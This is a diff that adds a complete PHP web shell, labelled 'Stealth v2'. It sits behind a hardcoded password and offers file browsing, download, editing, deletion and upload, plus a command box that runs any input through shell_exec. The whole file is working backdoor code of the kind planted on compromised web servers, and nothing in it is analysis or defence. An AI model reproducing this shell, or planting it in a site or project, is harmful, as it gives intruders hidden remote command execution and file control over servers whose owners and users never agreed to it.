@@ -1,0 +1,76 @@
+<?php
+$auth_pass = "bossqu123"; 
+session_start();
+if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
+if (isset($_POST['pass']) && $_POST['pass'] == $auth_pass) $_SESSION['logged'] = true;
+if (!isset($_SESSION['logged'])) {
+    die('<body style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;">
+         <form method="post"><input type="password" name="pass" style="background:transparent;border:1px solid #0f0;color:#0f0;" autofocus></form></body>');
+}
+
+$path = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
+if (!is_dir($path)) $path = dirname($path);
+chdir($path);
+
+// --- LOGIC: DOWNLOAD, EDIT, DELETE ---
+if (isset($_GET['get'])) {
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($_GET['get']).'"');
+    readfile($_GET['get']); exit;
+}
+if (isset($_POST['new_content'])) {
+    file_put_contents($_POST['edit_file'], $_POST['new_content']);
+    echo "<script>alert('Saved!'); window.location='?d=$path';</script>";
+}
+if (isset($_GET['del'])) {
+    $target = $_GET['del'];
+    is_dir($target) ? rmdir($target) : unlink($target);
+    header("Location: ?d=$path");
+}
+
+echo "<html><head><title>Stealth v2</title></head><body style='background:#111;color:#0f0;font-family:monospace;padding:20px;'>";
+echo "<h2>MANAGER v2.0</h2>";
+echo "<b>PATH:</b> ";
+$parts = explode(DIRECTORY_SEPARATOR, $path);
+foreach ($parts as $id => $val) {
+    echo "<a href='?d=".implode(DIRECTORY_SEPARATOR, array_slice($parts, 0, $id+1))."' style='color:#0f0;'>$val</a> / ";
+}
+echo " [<a href='?logout' style='color:red;'>Logout</a>]<hr>";
+
+// --- UPLOADER & CMD ---
+echo '<div style="display:flex;gap:20px;margin-bottom:20px;">
+      <form enctype="multipart/form-data" method="POST">Upload: <input type="file" name="f"><input type="submit" value="Go"></form>
+      <form method="POST" style="flex-grow:1;">CMD: <input type="text" name="c" style="width:80%;background:#222;color:#0f0;border:1px solid #0f0;"></form>
+      </div>';
+
+if(isset($_FILES['f'])) move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
+if(isset($_POST['c'])) echo "<pre style='background:#000;padding:10px;border:1px solid #0f0;'>".shell_exec($_POST['c']." 2>&1")."</pre>";
+
+// --- FILE EDITOR (HIDDEN BY DEFAULT) ---
+if (isset($_GET['edit'])) {
+    $content = htmlspecialchars(file_get_contents($_GET['edit']));
+    echo "<form method='POST'><h3>Editing: ".basename($_GET['edit'])."</h3>
+          <input type='hidden' name='edit_file' value='".$_GET['edit']."'>
+          <textarea name='new_content' style='width:100%;height:300px;background:#222;color:#0f0;'>$content</textarea><br>
+          <input type='submit' value='Save File'></form><hr>";
+}
+
+// --- FILE LIST ---
+echo "<table border='1' width='100%' style='border-collapse:collapse;text-align:left;'>
+      <tr style='background:#333;'><th>Name</th><th>Size</th><th>Actions</th></tr>";
+$items = scandir($path);
+foreach ($items as $v) {
+    if($v == ".") continue;
+    $p = $path.DIRECTORY_SEPARATOR.$v;
+    $s = is_dir($p) ? "DIR" : round(filesize($p)/1024, 2)." KB";
+    echo "<tr>
+            <td><a href='?d=$p' style='color:".(is_dir($p)?"#55f":"#0f0").";'>$v</a></td>
+            <td>$s</td>
+            <td>
+                <a href='?d=$path&get=$p' style='color:orange;'>[Get]</a> 
+                <a href='?d=$path&edit=$p' style='color:yellow;'>[Edit]</a> 
+                <a href='?d=$path&del=$p' onclick='return confirm(\"Del?\")' style='color:red;'>[X]</a>
+            </td>
+          </tr>";
+}
+echo "</table></body></html>";
